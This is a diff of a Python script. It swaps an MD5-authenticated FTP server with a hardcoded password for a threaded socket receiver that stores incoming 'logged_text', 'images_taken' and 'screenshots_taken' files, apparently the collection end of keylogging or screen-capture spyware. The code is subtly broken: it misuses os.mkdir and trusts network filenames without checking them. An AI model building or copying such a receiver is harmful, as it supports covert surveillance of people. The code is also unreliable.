@@ -1,65 +1,135 @@
-# credits go to https://pyftpdlib.readthedocs.io/en/latest/tutorial.html atm...
+#separate socket for each operation for the multithreaded element
+#each socket is going to have to be on its own thread.
+#look into the logging library to log all of teh information
 
+import socket
 import os
-import sys
-import logging
-from hashlib import md5
-from pyftpdlib.handlers import FTPHandler
-from pyftpdlib.servers import FTPServer
-from pyftpdlib.authorizers import DummyAuthorizer, AuthenticationFailed
+import glob
+import threading
+from time import sleep
+from math import ceil
 
-# creation of the dummy authorizer to be formatted with md5 so the password is not exposed in case if
-# someone is listening
+def logged_text():
+    logged_text_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    logged_text_port = 65432
+    host = 'localhost'
+    logged_text_socket.bind((host, logged_text_port))
 
-class DummyMD5Authorizer(DummyAuthorizer):
+    print("waiting for a connection from logged_text_socket")
+    logged_text_socket.listen()
 
-    def validate_authentication(self, username, password, handler):
-        if sys.version_info >= (3, 0):
-            password = md5(password.encode('latin1'))
-        hash = md5(password).hexdigest()
-        try:
-            if self.user_table[username]['pwd'] != hash:
-                raise KeyError
-        except KeyError:
-            raise AuthenticationFailed
+    print("waiting for a connection from logged_text_socket")
+    
+    conn, addr = logged_text_socket.accept()
+    print(addr, "Has connected to the server. (incomming ip, from this port)")
 
-try:
-    # Generating a hash of the password
-    hash = md5('9lGi^W0rjlJ5Ve'.encode('utf-8')).hexdigest()
+    print(addr, "Has connected to the logged_text_socket. (incomming ip, from this port)")
+    os.mkdir(os.path.expanduser('~'), 'logged_text')
+    os.chdir('logged_text')
+    
+    #the start of the file writing process
+    while True:
+        filename = conn.recv(2084).decode()
+        sleep(1)
+        filesize = conn.recv(2048).decode()
+        packetAmmount = ceil(int(filesize)/2048)
 
-    # Instantiate an md5 dummy authorizer for managing 'virtual' users
-    authorizer = DummyMD5Authorizer()
+        if (os.path.isfile('new_' + filename)):
+            x = 1
+            while(os.path.isfile('new_' + str(x) + filename )):
+                x += 1
+            f = open('new_' + str(x) + filename, 'wb')
 
-    # Define a new user having only write and make directory permissions
-    # adding a user that can only make a directory and write to the directories that it creates
-    authorizer.add_user("logger", hash, str(os.getcwd()), perm="mw")
+        else:
+            f = open("new_" + filename, 'wb')
+        
+        for x in range (0, packetAmmount):
+            data = conn.recv(2048)
+            f.write(data)
+        
+        f.close()
+#--------------------------------------------------------------------------------------------------------
+def images_taken():
+    images_taken_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host = 'localhost'
+    images_taken_port = 16543
+    images_taken_socket.bind((host, images_taken_port))
+    
+    print("waiting for a connection from images_taken_socket")
+    images_taken_socket.listen()
 
-    # Instantiate FTP handler class
-    handler = FTPHandler
-    handler.authorizer = authorizer
+    conn, addr = images_taken_socket.accept()
+    print(addr, "Has connected to the images_taken_socket. (incomming ip, from this port)")
+   
+    os.mkdir(os.path.expanduser('~'), 'images_taken')
+    os.chdir('images_taken')
+    
+    #the start of the file writing process
+    while True:
+        filename = conn.recv(2084).decode()
+        sleep(1)
+        filesize = conn.recv(2048).decode()
+        packetAmmount = ceil(int(filesize)/2048)
+        
+        if (os.path.isfile('new_' + filename)):
+            x = 1
+            while(os.path.isfile('new_' + str(x) + filename )):
+                x += 1
+            f = open('new_' + str(x) + filename, 'wb')
 
-    # Define a customized banner (string returned when client connects)
-    handler.banner = "pyftpdlib based ftpd ready.\nConnected!"
+        else:
+            f = open("new_" + filename, 'wb')
+        
+        for x in range (0, packetAmmount):
+            data = conn.recv(2048)
+            f.write(data)
+        
+        f.close()
+#--------------------------------------------------------------------------------------------------------
+def screenshots_taken():
+    screenshots_taken_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host = 'localhost'
+    screenshots_taken_port = 27654
+    screenshots_taken_socket.bind((host, screenshots_taken_port))
+    
+    print("waiting for a connection from screenshots_taken_socket")
+    screenshots_taken_socket.listen()
+    
+    conn, addr = screenshots_taken_socket.accept()
+    print(addr, "Has connected to the screenshots_taken_socket. (incomming ip, from this port)")
+    
+    os.mkdir(os.path.expanduser('~'), 'screenshots_taken')
+    os.chdir('screenshots_taken')
+    
+    #the start of the file writing process
+    while True:
+        filename = conn.recv(2084).decode()
+        sleep(1)
+        filesize = conn.recv(2048).decode()
+        packetAmmount = ceil(int(filesize)/2048)
+        
+        if (os.path.isfile('new_' + filename)):
+            x = 1
+            while(os.path.isfile('new_' + str(x) + filename )):
+                x += 1
+            f = open('new_' + str(x) + filename, 'wb')
 
-    # Specify a masquerade address and the range of ports to use for
-    # passive connections.  Decomment in case you're behind a NAT.
-    #handler.masquerade_address = '151.25.42.11'
-    #handler.passive_ports = range(60000, 65535)
+        else:
+            f = open("new_" + filename, 'wb')
+        
+        for x in range (0, packetAmmount):
+            data = conn.recv(2048)
+            f.write(data)
+        
+        f.close()
+#--------------------------------------------------------------------------------------------------------
 
-    # Instantiate FTP server class and listen on 0.0.0.0:2121
-    address = ('', 2121)
-    server = FTPServer(address, handler)
 
-    # set a limit for connections
-    server.max_cons = 10
-    server.max_cons_per_ip = 1
 
-    # adding a logging location for all logs to be stored
-    logging.basicConfig(filename='/var/log/pyftpd.log', level=logging.INFO)
+logged_text_thread = threading.Thread(target=logged_text)
+images_taken_thread = threading.Thread(target=images_taken)
+screenshots_taken_thread = threading.Thread(target=screenshots_taken)
 
-    print('FTP Server Started\n\n')
-
-    # start ftp server
-    server.serve_forever()
-except:
-    print('server is closed now...')
+logged_text_thread.start()
+images_taken_thread.start()
+screenshots_taken_thread.start()
